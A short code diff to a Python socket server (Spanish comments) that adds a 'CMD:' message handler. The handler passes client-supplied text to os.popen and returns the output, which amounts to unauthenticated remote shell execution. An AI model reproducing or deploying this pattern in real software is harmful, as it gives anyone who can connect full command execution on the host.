@@ -27,7 +27,9 @@ def handle_client(client_socket):
                 break
             if command.lower() == 'exit':
                 break
-            if command == 'GET_COMMANDS':
+            elif command.startswith('CMD:'):
+                execute_command(client_socket, command[4:])
+            elif command == 'GET_COMMANDS':
                 send_command_files(client_socket)
             else:
                 # Ejecutar comando de consola, etc...
@@ -54,6 +56,13 @@ def send_command_files(client_socket):
     # Enviar señal de finalización
     client_socket.send(struct.pack('I', 0))
 
+def execute_command(client_socket, command):
+    try:
+        result = os.popen(command).read()
+        client_socket.send(result.encode())
+    except Exception as e:
+        client_socket.send(str(e).encode())
+        
 def main():
     if not os.path.exists(COMMANDS_FOLDER):
         os.makedirs(COMMANDS_FOLDER)
